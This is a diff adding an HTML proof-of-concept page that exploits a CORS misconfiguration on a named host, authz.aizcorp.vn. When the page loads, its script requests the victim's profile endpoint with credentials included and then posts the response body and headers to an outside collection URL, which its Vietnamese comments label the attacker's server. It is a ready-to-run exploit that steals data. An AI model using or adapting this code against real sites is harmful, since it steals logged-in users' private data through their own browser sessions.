@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration PoC</h1>
+  <p>Target: https://authz.aizcorp.vn</p>
+  <p>Status: <span id="status">Running...</span></p>
+  <pre id="output"></pre>
+
+  <script>
+    const TARGET = "https://authz.aizcorp.vn";
+    const EXFIL = "https://your-pentest-domain.com/collect"; // endpoint nhận dữ liệu
+
+    async function exploit() {
+      const output = document.getElementById('output');
+      const status = document.getElementById('status');
+
+      try {
+        // Bước 1: Gửi request với credentials
+        const resp = await fetch(`${TARGET}/api/profile/info`, {
+          method: 'GET',
+          credentials: 'include',  // 🔴 Gửi cookie cross-origin
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        const body = await resp.text();
+
+        output.textContent = 
+          `Status: ${resp.status}\n` +
+          `Access-Control-Allow-Origin: ${resp.headers.get('access-control-allow-origin')}\n` +
+          `Access-Control-Allow-Credentials: ${resp.headers.get('access-control-allow-credentials')}\n` +
+          `Body: ${body}`;
+
+        status.textContent = "✅ CORS BYPASS SUCCESS";
+
+        // Bước 2: Gửi dữ liệu về server attacker
+        await fetch(EXFIL, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify({
+            status: resp.status,
+            body: body,
+            headers: Object.fromEntries(resp.headers.entries())
+          })
+        });
+
+      } catch (err) {
+        output.textContent = `Error: ${err.message}`;
+        status.textContent = "❌ FAILED — CORS blocked";
+      }
+    }
+
+    exploit();
+  </script>
+</body>
+</html>
